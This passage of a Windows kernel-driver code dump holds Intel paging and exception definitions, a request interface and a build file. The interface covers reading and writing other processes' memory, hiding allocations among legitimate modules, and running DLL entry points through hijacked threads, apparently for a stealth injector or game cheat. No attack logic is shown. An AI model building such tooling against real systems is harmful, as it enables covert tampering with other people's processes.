   * @note Processors after the Intel386 processor do not generate this exception.
   */
  CoprocessorSegmentOverrun = 0x00000009,

  /**
   * #TS - Invalid TSS.
   * Source: Task switch or TSS access.
   * Error Code: Yes.
   */
  InvalidTss = 0x0000000A,

  /**
   * #NP - Segment Not Present.
   * Source: Loading segment registers or accessing system segments.
   * Error Code: Yes.
   */
  SegmentNotPresent = 0x0000000B,

  /**
   * #SS - Stack Segment Fault.
   * Source: Stack operations and SS register loads.
   * Error Code: Yes.
   */
  StackSegmentFault = 0x0000000C,

  /**
   * #GP - General Protection.
   * Source: Any memory reference and other protection checks.
   * Error Code: Yes.
   */
  GeneralProtection = 0x0000000D,

  /**
   * #PF - Page Fault.
   * Source: Any memory reference.
   * Error Code: Yes.
   */
  PageFault = 0x0000000E,

  /**
   * #MF - Floating-Point Error (Math Fault).
   * Source: Floating-point or WAIT/FWAIT instruction.
   * Error Code: No.
   */
  X87FloatingPointError = 0x00000010,

  /**
   * #AC - Alignment Check.
   * Source: Any data reference in memory.
   * Error Code: Yes.
   */
  AlignmentCheck = 0x00000011,

  /**
   * #MC - Machine Check.
   * Source: Model dependent machine check errors.
   * Error Code: No.
   */
  MachineCheck = 0x00000012,

  /**
   * #XM - SIMD Floating-Point Numeric Error.
   * Source: SSE/SSE2/SSE3 floating-point instructions.
   * Error Code: No.
   */
  SimdFloatingPointError = 0x00000013,

  /**
   * #VE - Virtualization Exception.
   * Source: EPT violations.
   * Error Code: No.
   */
  VirtualizationException = 0x00000014,
} EXCEPTION_VECTOR;

/**
 * @brief When an exception condition is related to a specific segment selector or IDT vector, the
 * processor pushes an error code onto the stack of the exception handler (whether it is a procedure
 * or task). The error code resembles a segment selector; however, instead of a TI flag and RPL
 * field, the error code contains 3 different flags
 *
 * @see Vol3A[6.13(ERROR CODE)] (reference)
 */
typedef union {
  struct {
    /**
     * [Bit 0] When set, indicates that the exception occurred during delivery of an event external
     * to the program, such as an interrupt or an earlier exception. The bit is cleared if the
     * exception occurred during delivery of a software interrupt (INT n, INT3, or INTO).
     */
    UINT32 ExternalEvent : 1;
#define EXCEPTION_ERROR_CODE_EXTERNAL_EVENT_BIT 0
#define EXCEPTION_ERROR_CODE_EXTERNAL_EVENT_FLAG 0x01
#define EXCEPTION_ERROR_CODE_EXTERNAL_EVENT_MASK 0x01
#define EXCEPTION_ERROR_CODE_EXTERNAL_EVENT(_) (((_) >> 0) & 0x01)

    /**
     * [Bit 1] When set, indicates that the index portion of the error code refers to a gate
     * descriptor in the IDT; when clear, indicates that the index refers to a descriptor in the GDT
     * or the current LDT.
     */
    UINT32 DescriptorLocation : 1;
#define EXCEPTION_ERROR_CODE_DESCRIPTOR_LOCATION_BIT 1
#define EXCEPTION_ERROR_CODE_DESCRIPTOR_LOCATION_FLAG 0x02
#define EXCEPTION_ERROR_CODE_DESCRIPTOR_LOCATION_MASK 0x01
#define EXCEPTION_ERROR_CODE_DESCRIPTOR_LOCATION(_) (((_) >> 1) & 0x01)

    /**
     * [Bit 2] Only used when the IDT flag is clear. When set, the TI flag indicates that the index
     * portion of the error code refers to a segment or gate descriptor in the LDT; when clear, it
     * indicates that the index refers to a descriptor in the current GDT.
     */
    UINT32 GdtLdt : 1;
#define EXCEPTION_ERROR_CODE_GDT_LDT_BIT 2
#define EXCEPTION_ERROR_CODE_GDT_LDT_FLAG 0x04
#define EXCEPTION_ERROR_CODE_GDT_LDT_MASK 0x01
#define EXCEPTION_ERROR_CODE_GDT_LDT(_) (((_) >> 2) & 0x01)

    /**
     * [Bits 15:3] The segment selector index field provides an index into the IDT, GDT, or current
     * LDT to the segment or gate selector being referenced by the error code. In some cases the
     * error code is null (all bits are clear except possibly EXT). A null error code indicates that
     * the error was not caused by a reference to a specific segment or that a null segment selector
     * was referenced in an operation.
     *
     * @note The format of the error code is different for page-fault exceptions (#PF).
     */
    UINT32 Index : 13;
#define EXCEPTION_ERROR_CODE_INDEX_BIT 3
#define EXCEPTION_ERROR_CODE_INDEX_FLAG 0xFFF8
#define EXCEPTION_ERROR_CODE_INDEX_MASK 0x1FFF
#define EXCEPTION_ERROR_CODE_INDEX(_) (((_) >> 3) & 0x1FFF)
    UINT32 Reserved1 : 16;
  };

  UINT32 Flags;
} EXCEPTION_ERROR_CODE;

/**
 * @brief Page fault exception
 *
 * @see Vol3A[4.7(PAGE-FAULT EXCEPTIONS)] (reference)
 */
typedef union {
  struct {
    /**
     * [Bit 0] This flag is 0 if there is no translation for the linear address because the P flag
     * was 0 in one of the pagingstructure entries used to translate that address.
     */
    UINT32 Present : 1;
#define PAGE_FAULT_EXCEPTION_PRESENT_BIT 0
#define PAGE_FAULT_EXCEPTION_PRESENT_FLAG 0x01
#define PAGE_FAULT_EXCEPTION_PRESENT_MASK 0x01
#define PAGE_FAULT_EXCEPTION_PRESENT(_) (((_) >> 0) & 0x01)

    /**
     * [Bit 1] If the access causing the page-fault exception was a write, this flag is 1;
     * otherwise, it is 0. This flag describes the access causing the page-fault exception, not the
     * access rights specified by paging.
     */
    UINT32 Write : 1;
#define PAGE_FAULT_EXCEPTION_WRITE_BIT 1
#define PAGE_FAULT_EXCEPTION_WRITE_FLAG 0x02
#define PAGE_FAULT_EXCEPTION_WRITE_MASK 0x01
#define PAGE_FAULT_EXCEPTION_WRITE(_) (((_) >> 1) & 0x01)

    /**
     * [Bit 2] If a user-mode access caused the page-fault exception, this flag is 1; it is 0 if a
     * supervisor-mode access did so. This flag describes the access causing the page-fault
     * exception, not the access rights specified by paging.
     *
     * @see Vol3A[4.6(ACCESS RIGHTS)]
     */
    UINT32 UserModeAccess : 1;
#define PAGE_FAULT_EXCEPTION_USER_MODE_ACCESS_BIT 2
#define PAGE_FAULT_EXCEPTION_USER_MODE_ACCESS_FLAG 0x04
#define PAGE_FAULT_EXCEPTION_USER_MODE_ACCESS_MASK 0x01
#define PAGE_FAULT_EXCEPTION_USER_MODE_ACCESS(_) (((_) >> 2) & 0x01)

    /**
     * [Bit 3] This flag is 1 if there is no translation for the linear address because a reserved
     * bit was set in one of the pagingstructure entries used to translate that address. (Because
     * reserved bits are not checked in a paging-structure entry whose P flag is 0, bit 3 of the
     * error code can be set only if bit 0 is also set). Bits reserved in the paging-structure
     * entries are reserved for future functionality. Software developers should be aware that such
     * bits may be used in the future and that a paging-structure entry that causes a page-fault
     * exception on one processor might not do so in the future.
     */
    UINT32 ReservedBitViolation : 1;
#define PAGE_FAULT_EXCEPTION_RESERVED_BIT_VIOLATION_BIT 3
#define PAGE_FAULT_EXCEPTION_RESERVED_BIT_VIOLATION_FLAG 0x08
#define PAGE_FAULT_EXCEPTION_RESERVED_BIT_VIOLATION_MASK 0x01
#define PAGE_FAULT_EXCEPTION_RESERVED_BIT_VIOLATION(_) (((_) >> 3) & 0x01)

    /**
     * [Bit 4] This flag is 1 if (1) the access causing the page-fault exception was an instruction
     * fetch; and (2) either (a) CR4.SMEP = 1; or (b) both (i) CR4.PAE = 1 (either PAE paging or
     * 4-level paging is in use); and (ii) IA32_EFER.NXE = 1. Otherwise, the flag is 0. This flag
     * describes the access causing the page-fault exception, not the access rights specified by
     * paging.
     */
    UINT32 Execute : 1;
#define PAGE_FAULT_EXCEPTION_EXECUTE_BIT 4
#define PAGE_FAULT_EXCEPTION_EXECUTE_FLAG 0x10
#define PAGE_FAULT_EXCEPTION_EXECUTE_MASK 0x01
#define PAGE_FAULT_EXCEPTION_EXECUTE(_) (((_) >> 4) & 0x01)

    /**
     * [Bit 5] This flag is 1 if (1) IA32_EFER.LMA = CR4.PKE = 1; (2) the access causing the
     * page-fault exception was a data access; (3) the linear address was a user-mode address with
     * protection key i; and (5) the PKRU register is such that either (a) ADi = 1; or (b) the
     * following all hold: (i) WDi = 1; (ii) the access is a write access; and (iii) either CR0.WP =
     * 1 or the access causing the page-fault exception was a user-mode access.
     *
     * @see Vol3A[4.6.2(Protection Keys)]
     */
    UINT32 ProtectionKeyViolation : 1;
#define PAGE_FAULT_EXCEPTION_PROTECTION_KEY_VIOLATION_BIT 5
#define PAGE_FAULT_EXCEPTION_PROTECTION_KEY_VIOLATION_FLAG 0x20
#define PAGE_FAULT_EXCEPTION_PROTECTION_KEY_VIOLATION_MASK 0x01
#define PAGE_FAULT_EXCEPTION_PROTECTION_KEY_VIOLATION(_) (((_) >> 5) & 0x01)
    UINT32 Reserved1 : 9;

    /**
     * [Bit 15] This flag is 1 if the exception is unrelated to paging and resulted from violation
     * of SGX-specific access-control requirements. Because such a violation can occur only if there
     * is no ordinary page fault, this flag is set only if the P flag (bit 0) is 1 and the RSVD flag
     * (bit 3) and the PK flag (bit 5) are both 0.
     */
    UINT32 Sgx : 1;
#define PAGE_FAULT_EXCEPTION_SGX_BIT 15
#define PAGE_FAULT_EXCEPTION_SGX_FLAG 0x8000
#define PAGE_FAULT_EXCEPTION_SGX_MASK 0x01
#define PAGE_FAULT_EXCEPTION_SGX(_) (((_) >> 15) & 0x01)
    UINT32 Reserved2 : 16;
  };

  UINT32 Flags;
} PAGE_FAULT_EXCEPTION;

/**
 * @}
 */

/**
 * @defgroup MEMORY_TYPE \
 *           Memory caching type
 *
 * The processor allows any area of system memory to be cached in the L1, L2, and L3 caches. In
 * individual pages or regions of system memory, it allows the type of caching (also called memory
 * type) to be specified.
 *
 * @see Vol3A[11.11(MEMORY TYPE RANGE REGISTERS (MTRRS))]
 * @see Vol3A[11.5(CACHE CONTROL)]
 * @see Vol3A[11.3(METHODS OF CACHING AVAILABLE)] (reference)
 * @{
 */
/**
 * @brief Strong Uncacheable (UC)
 *
 * System memory locations are not cached. All reads and writes appear on the system bus and are
 * executed in program order without reordering. No speculative memory accesses, pagetable walks, or
 * prefetches of speculated branch targets are made. This type of cache-control is useful for
 * memory-mapped I/O devices. When used with normal RAM, it greatly reduces processor performance.
 */
#define MEMORY_TYPE_UNCACHEABLE 0x00000000

/**
 * @brief Write Combining (WC)
 *
 * System memory locations are not cached (as with uncacheable memory) and coherency is not enforced
 * by the processor's bus coherency protocol. Speculative reads are allowed. Writes may be delayed
 * and combined in the write combining buffer (WC buffer) to reduce memory accesses. If the WC
 * buffer is partially filled, the writes may be delayed until the next occurrence of a serializing
 * event; such as, an SFENCE or MFENCE instruction, CPUID execution, a read or write to uncached
 * memory, an interrupt occurrence, or a LOCK instruction execution. This type of cache-control is
 * appropriate for video frame buffers, where the order of writes is unimportant as long as the
 * writes update memory so they can be seen on the graphics display. This memory type is available
 * in the Pentium Pro and Pentium II processors by programming the MTRRs; or in processor families
 * starting from the Pentium III processors by programming the MTRRs or by selecting it through the
 * PAT.
 *
 * @see Vol3A[11.3.1(Buffering of Write Combining Memory Locations)]
 */
#define MEMORY_TYPE_WRITE_COMBINING 0x00000001

/**
 * @brief Write-through (WT)
 *
 * Writes and reads to and from system memory are cached. Reads come from cache lines on cache hits;
 * read misses cause cache fills. Speculative reads are allowed. All writes are written to a cache
 * line (when possible) and through to system memory. When writing through to memory, invalid cache
 * lines are never filled, and valid cache lines are either filled or invalidated. Write combining
 * is allowed. This type of cache-control is appropriate for frame buffers or when there are devices
 * on the system bus that access system memory, but do not perform snooping of memory accesses. It
 * enforces coherency between caches in the processors and system memory.
 */
#define MEMORY_TYPE_WRITE_THROUGH 0x00000004

/**
 * @brief Write protected (WP)
 *
 * Reads come from cache lines when possible, and read misses cause cache fills. Writes are
 * propagated to the system bus and cause corresponding cache lines on all processors on the bus to
 * be invalidated. Speculative reads are allowed. This memory type is available in processor
 * families starting from the P6 family processors by programming the MTRRs.
 */
#define MEMORY_TYPE_WRITE_PROTECTED 0x00000005

/**
 * @brief Write-back (WB)
 *
 * Writes and reads to and from system memory are cached. Reads come from cache lines on cache hits;
 * read misses cause cache fills. Speculative reads are allowed. Write misses cause cache line fills
 * (in processor families starting with the P6 family processors), and writes are performed entirely
 * in the cache, when possible. Write combining is allowed. The write-back memory type reduces bus
 * traffic by eliminating many unnecessary writes to system memory. Writes to a cache line are not
 * immediately forwarded to system memory; instead, they are accumulated in the cache. The modified
 * cache lines are written to system memory later, when a write-back operation is performed.
 * Write-back operations are triggered when cache lines need to be deallocated, such as when new
 * cache lines are being allocated in a cache that is already full. They also are triggered by the
 * mechanisms used to maintain cache consistency. This type of cache-control provides the best
 * performance, but it requires that all devices that access system memory on the system bus be able
 * to snoop memory accesses to insure system memory and cache coherency.
 */
#define MEMORY_TYPE_WRITE_BACK 0x00000006

/**
 * @brief Uncacheable (UC-)
 *
 * Has same characteristics as the strong uncacheable (UC) memory type, except that this memory type
 * can be overridden by programming the MTRRs for the WC memory type. This memory type is available
 * in processor families starting from the Pentium III processors and can only be selected through
 * the PAT.
 */
#define MEMORY_TYPE_UNCACHEABLE_MINUS 0x00000007
#define MEMORY_TYPE_INVALID 0x000000FF
/**
 * @}
 */

/**
 * @}
 */

typedef struct _MEMORY_ACCESS_CONTEXT {
  //
  // Reserved virtual address (page) for access to the guest virtual memory
  // from the hypervisor.
  //
  VOID *ReservedPage;

  //
  // The pointer to the PTE of the reserved page.
  //
  PTE_64 *Pte;

  //
  // The address of the page table that is dynamically allocated to translate
  // ReservedPage with the 4KB page (and not the large page).
  //
  PTE_64 *AllocatedPageTable;
} MEMORY_ACCESS_CONTEXT;

typedef union _ADDRESS_TRANSLATION_HELPER {
  //
  // Indexes to locate paging-structure entries corresponds to this virtual
  // address.
  //
  struct {
    UINT64 Unused : 12;  //< [11:0]
    UINT64 Pt : 9;       //< [20:12]
    UINT64 Pd : 9;       //< [29:21]
    UINT64 Pdpt : 9;     //< [38:30]
    UINT64 Pml4 : 9;     //< [47:39]
  } AsIndex;

  //
  // The page offset for each type of pages. For example, for 4KB pages, bits
  // [11:0] are treated as the page offset and Mapping4Kb can be used for it.
  //
  union {
    UINT64 Mapping4Kb : 12;  //< [11:0]
    UINT64 Mapping2Mb : 21;  //< [20:0]
    UINT64 Mapping1Gb : 30;  //< [29:0]
  } AsPageOffset;

  UINT64 AsUInt64;
} ADDRESS_TRANSLATION_HELPER;
```

`driver/def/request.hpp`:

```hpp
#pragma once

enum class request_codes : std::uint32_t {
  base = 0x119,
  read = 0x129,
  write = 0x139,
  pattern = 0x179,
  success = 0x91a,
  unique = 0x92b,
  unload = 0x93c,
  allocate_independent_pages = 0x101c,
  execute_dll_entrypoint = 0x102c,
  swap_context = 0x103c,
  restore_context = 0x104c,
};

enum alloc_mode {
  ALLOC_INSIDE_MAIN_MODULE,
  ALLOC_BETWEEN_LEGIT_MODULES,
  ALLOC_AT_LOW_ADDRESS,
  ALLOC_AT_HIGH_ADDRESS,
  ALLOC_AT_HYPERSPACE
};

struct unload_request {
  bool* success;
};

struct read_request {
  std::uint32_t pid;
  std::uintptr_t address;
  void* buffer;
  size_t size;
  bool success;
};

struct write_request {
  std::uint32_t pid;
  std::uintptr_t address;
  void* buffer;
  size_t size;
  bool success;
};

struct base_request {
  std::uint32_t pid;
  std::uintptr_t handle;
  wchar_t name[260];
};

struct allocate_independent_pages_request {
  std::uint32_t local_pid;
  std::uint32_t target_pid;
  std::uint32_t target_tid;
  void* address;
  size_t size;
  memory_type mem_type;
  std::uint32_t mode;
};

struct execute_dll_via_thread_request {
  std::uint32_t local_pid;
  std::uint32_t target_pid;
  std::uint32_t target_tid;
  void* alloc_base;
  unsigned long entry_point;
  std::uint32_t alloc_mode;
  bool success;
};

struct pattern_request {
  std::int32_t pid;
  wchar_t mod_name[260];
  char signature[260];
  std::uintptr_t address;
};

struct swap_context_request {
  std::uint32_t target_tid;
  bool success;
};

struct request_data {
  std::uint32_t unique;
  request_codes code;
  void* data;
};
```

`driver/driver.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- Detect WDK Root -->
  <PropertyGroup>
    <WDKRoot>$([MSBuild]::GetRegistryValue('HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Kits\Installed Roots', 'KitsRoot10'))</WDKRoot>
    <WDKRoot Condition="'$(WDKRoot)' == ''">$([MSBuild]::GetRegistryValue('HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows Kits\Installed Roots', 'KitsRoot10'))</WDKRoot>
    <WDKRoot Condition="'$(WDKRoot)' == ''">C:\Program Files (x86)\Windows Kits\10\</WDKRoot>
  </PropertyGroup>
  <!-- Dynamically detect WDK version using Exists checks -->
  <Choose>
    <When Condition="Exists('$(WDKRoot)Include\10.0.26100.0\km')">
      <PropertyGroup>
        <WDKVersion>10.0.26100.0</WDKVersion>
      </PropertyGroup>
    </When>
    <When Condition="Exists('$(WDKRoot)Include\10.0.22621.0\km')">
      <PropertyGroup>
        <WDKVersion>10.0.22621.0</WDKVersion>
      </PropertyGroup>
    </When>
    <When Condition="Exists('$(WDKRoot)Include\10.0.22000.0\km')">
      <PropertyGroup>
        <WDKVersion>10.0.22000.0</WDKVersion>
      </PropertyGroup>
    </When>
    <When Condition="Exists('$(WDKRoot)Include\10.0.19041.0\km')">
      <PropertyGroup>
        <WDKVersion>10.0.19041.0</WDKVersion>
      </PropertyGroup>
    </When>
    <When Condition="Exists('$(WDKRoot)Include\10.0.18362.0\km')">
      <PropertyGroup>
        <WDKVersion>10.0.18362.0</WDKVersion>
      </PropertyGroup>
    </When>
    <Otherwise>
      <PropertyGroup>
        <!-- Fallback - try to detect any 10.0.* folder -->
        <WDKVersion>10.0.22621.0</WDKVersion>
      </PropertyGroup>
    </Otherwise>
  </Choose>
  <PropertyGroup>
    <WDKIncludePath>$(WDKRoot)Include\$(WDKVersion)\km</WDKIncludePath>
    <WDKLibPath>$(WDKRoot)Lib\$(WDKVersion)\km\x64</WDKLibPath>
  </PropertyGroup>
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{4c4c54e5-c199-4146-b5d7-fddc9fe74066}</ProjectGuid>
    <RootNamespace>driver</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
    <ProjectName>driver</ProjectName>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>ClangCL</PlatformToolset>
    <CharacterSet>NotSet</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>ClangCL</PlatformToolset>
    <WholeProgramOptimization>false</WholeProgramOptimization>
    <CharacterSet>MultiByte</CharacterSet>
    <TargetVersion>Windows10</TargetVersion>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
    <DriverType>KMDF</DriverType>
    <ALLOW_DATE_TIME>1</ALLOW_DATE_TIME>
    <Driver_SpectreMitigation>false</Driver_SpectreMitigation>
    <PreferredToolArchitecture>x64</PreferredToolArchitecture>
    <LLVMToolsVersion>17</LLVMToolsVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
    <OutDir>$(SolutionDir)bin\</OutDir>
    <IntDir>$(SolutionDir)bin\intermediates\</IntDir>
    <TargetName>$(ProjectName)_debug_x64</TargetName>
    <TargetExt>.sys</TargetExt>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
    <OutDir>$(SolutionDir)bin\</OutDir>
    <IntDir>$(SolutionDir)bin\intermediates\</IntDir>
    <TargetName>$(ProjectName)_x64</TargetName>
    <EnableInf2cat>false</EnableInf2cat>
    <IncludePath>$(WDKIncludePath);$(IncludePath)</IncludePath>
    <LibraryPath>$(WDKLibPath);$(LibraryPath)</LibraryPath>
    <TargetExt>.sys</TargetExt>
    <GenerateManifest>false</GenerateManifest>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <LanguageStandard>stdcpp20</LanguageStandard>
      <LanguageStandard_C>stdc17</LanguageStandard_C>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>TurnOffAllWarnings</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>false</IntrinsicFunctions>
      <SDLCheck>false</SDLCheck>
      <PreprocessorDefinitions>_WIN64;_AMD64_;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>false</ConformanceMode>
      <LanguageStandard>stdcpp20</LanguageStandard>
      <LanguageStandard_C>stdc17</LanguageStandard_C>
      <Optimization>MaxSpeed</Optimization>
      <InlineFunctionExpansion>AnySuitable</InlineFunctionExpansion>
      <OmitFramePointers>true</OmitFramePointers>
      <EnableFiberSafeOptimizations>true</EnableFiberSafeOptimizations>
      <FavorSizeOrSpeed>Speed</FavorSizeOrSpeed>
      <WholeProgramOptimization>false</WholeProgramOptimization>
      <DebugInformationFormat>None</DebugInformationFormat>
      <MultiProcessorCompilation>true</MultiProcessorCompilation>
      <ExceptionHandling>false</ExceptionHandling>
      <BufferSecurityCheck>false</BufferSecurityCheck>
      <OmitDefaultLibName>true</OmitDefaultLibName>
      <ControlFlowGuard>false</ControlFlowGuard>
      <RuntimeLibrary>
      </RuntimeLibrary>
      <FloatingPointModel>Precise</FloatingPointModel>
      <CallingConvention>FastCall</CallingConvention>
      <CompileAs>CompileAsCpp</CompileAs>
      <BasicRuntimeChecks>Default</BasicRuntimeChecks>
      <AdditionalIncludeDirectories>$(WDKIncludePath);%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
    </ClCompile>
    <Link>
      <SubSystem>Native</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>false</GenerateDebugInformation>
      <IgnoreAllDefaultLibraries>true</IgnoreAllDefaultLibraries>
      <MinimumRequiredVersion>$(SUBSYSTEM_NATVER)</MinimumRequiredVersion>
      <Driver>WDM</Driver>
      <EntryPointSymbol>entry</EntryPointSymbol>
      <RandomizedBaseAddress />
      <DataExecutionPrevention />
      <SetChecksum>true</SetChecksum>
      <AdditionalDependencies>ntoskrnl.lib</AdditionalDependencies>
      <ProgramDatabaseFile />
      <HeapReserveSize>
      </HeapReserveSize>
      <HeapCommitSize>
      </HeapCommitSize>
      <StackReserveSize>
      </StackReserveSize>
      <StackCommitSize>
      </StackCommitSize>
      <LinkTimeCodeGeneration>
      </LinkTimeCodeGeneration>
      <MergeSections>_TEXT=.text;_PAGE=PAGE;.rdata=.text</MergeSections>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="def\globals.cpp" />
    <ClCompile Include="entry.cpp" />
    <ClCompile Include="hde\hde32.cpp" />
    <ClCompile Include="hde\hde64.cpp" />
    <ClCompile Include="mem\detection.cpp" />
    <ClCompile Include="mem\hyperspace.cpp" />
    <ClCompile Include="mem\mem.cpp" />
    <ClCompile Include="mem\page_table.cpp" />
    <ClCompile Include="mem\phys.cpp" />
    <ClCompile Include="mem\pt_hook.cpp" />
    <ClCompile Include="mem\validation.cpp" />
    <ClCompile Include="utils\intrin.cpp" />
    <ClCompile Include="utils\utils.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="def\globals.hpp" />
    <ClInclude Include="hde\hde.h" />
    <ClInclude Include="hde\hde32.h" />
    <ClInclude Include="hde\hde64.h" />
    <ClInclude Include="hde\hde_stdint.h" />
    <ClInclude Include="hde\table32.h" />
    <ClInclude Include="hde\table64.h" />
    <ClInclude Include="mem\detection.hpp" />
    <ClInclude Include="mem\pt_hook.hpp" />
    <ClInclude Include="mem\hyperspace.hpp" />
    <ClInclude Include="mem\mem.hpp" />
    <ClInclude Include="mem\phys.hpp" />
    <ClInclude Include="mem\page_table.hpp" />
    <ClInclude Include="init.hpp" />
    <ClInclude Include="def\ia32.hpp" />
    <ClInclude Include="def\request.hpp" />
    <ClInclude Include="def\def.hpp" />
    <ClInclude Include="mem\scan.hpp" />
    <ClInclude Include="mem\validation.hpp" />
    <ClInclude Include="utils\intrin.hpp" />
    <ClInclude Include="utils\raii.hpp" />
    <ClInclude Include="utils\utils.hpp" />
  </ItemGroup>
  <ItemGroup>
    <None Include="hde\LICENSE" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
  <Target Name="ShowWDKPaths" BeforeTargets="Build">
    <Message Text="WDK Root: $(WDKRoot)" Importance="high" />
    <Message Text="WDK Version: $(WDKVersion)" Importance="high" />
    <Message Text="WDK Include Path: $(WDKIncludePath)" Importance="high" />
    <Message Text="WDK Lib Path: $(WDKLibPath)" Importance="high" />
  </Target>
</Project>
```

`driver/driver.vcxproj.filters`:

